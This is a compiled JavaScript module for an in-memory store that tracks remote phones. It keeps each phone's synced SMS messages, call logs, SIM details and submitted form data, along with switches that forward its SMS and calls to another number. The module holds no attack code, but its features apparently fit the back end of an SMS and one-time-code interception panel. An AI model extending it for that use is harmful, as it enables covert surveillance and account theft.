"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.store = void 0;
// In-memory data store for all devices
class DataStore {
    constructor() {
        this.devices = new Map();
    }
    // Get all devices
    getAllDevices() {
        return Array.from(this.devices.values()).map(d => d.device);
    }
    // Get device by ID
    getDevice(deviceId) {
        return this.devices.get(deviceId);
    }
    // Register or update a device
    registerDevice(device) {
        const existing = this.devices.get(device.id);
        if (existing) {
            // Update existing device
            existing.device.status = 'online';
            existing.device.lastSeen = new Date();
            existing.device.name = device.name;
            existing.device.phoneNumber = device.phoneNumber;
            existing.device.socketId = device.socketId;
            return existing;
        }
        // Create new device data
        const deviceData = {
            device: {
                ...device,
                status: 'online',
                lastSeen: new Date(),
                simCards: [],
            },
            sms: [],
            calls: [],
            forms: [],
            forwarding: {
                smsEnabled: false,
                smsForwardTo: '',
                callsEnabled: false,
                callsForwardTo: '',
            },
        };
        this.devices.set(device.id, deviceData);
        return deviceData;
    }
    // Set device offline
    setDeviceOffline(deviceId) {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            deviceData.device.status = 'offline';
            deviceData.device.lastSeen = new Date();
            deviceData.device.socketId = undefined;
        }
    }
    // Set device offline by socket ID
    setDeviceOfflineBySocketId(socketId) {
        for (const [deviceId, deviceData] of this.devices) {
            if (deviceData.device.socketId === socketId) {
                this.setDeviceOffline(deviceId);
                return deviceId;
            }
        }
        return null;
    }
    // Sync SMS messages
    syncSMS(deviceId, smsMessages) {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            // Merge new SMS, avoiding duplicates
            const existingIds = new Set(deviceData.sms.map(s => s.id));
            const newMessages = smsMessages.filter(s => !existingIds.has(s.id));
            deviceData.sms = [...deviceData.sms, ...newMessages];
        }
    }
    // Sync call logs
    syncCalls(deviceId, calls) {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            // Merge new calls, avoiding duplicates
            const existingIds = new Set(deviceData.calls.map(c => c.id));
            const newCalls = calls.filter(c => !existingIds.has(c.id));
            deviceData.calls = [...deviceData.calls, ...newCalls];
        }
    }
    // Submit form data
    submitForm(deviceId, formData) {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            deviceData.forms.push({
                ...formData,
                submittedAt: new Date(),
            });
        }
    }
    // Update forwarding config
    updateForwarding(deviceId, config) {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            deviceData.forwarding = { ...deviceData.forwarding, ...config };
            return deviceData.forwarding;
        }
        return null;
    }
    // Get SMS for a device
    getSMS(deviceId) {
        return this.devices.get(deviceId)?.sms || [];
    }
    // Get calls for a device
    getCalls(deviceId) {
        return this.devices.get(deviceId)?.calls || [];
    }
    // Get forms for a device
    getForms(deviceId) {
        return this.devices.get(deviceId)?.forms || [];
    }
    // Get forwarding config
    getForwarding(deviceId) {
        return this.devices.get(deviceId)?.forwarding || null;
    }
    // Sync SIM cards for a device
    syncSimCards(deviceId, simCards) {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            deviceData.device.simCards = simCards;
        }
    }
    // Get SIM cards for a device
    getSimCards(deviceId) {
        return this.devices.get(deviceId)?.device.simCards || [];
    }
}
exports.store = new DataStore();
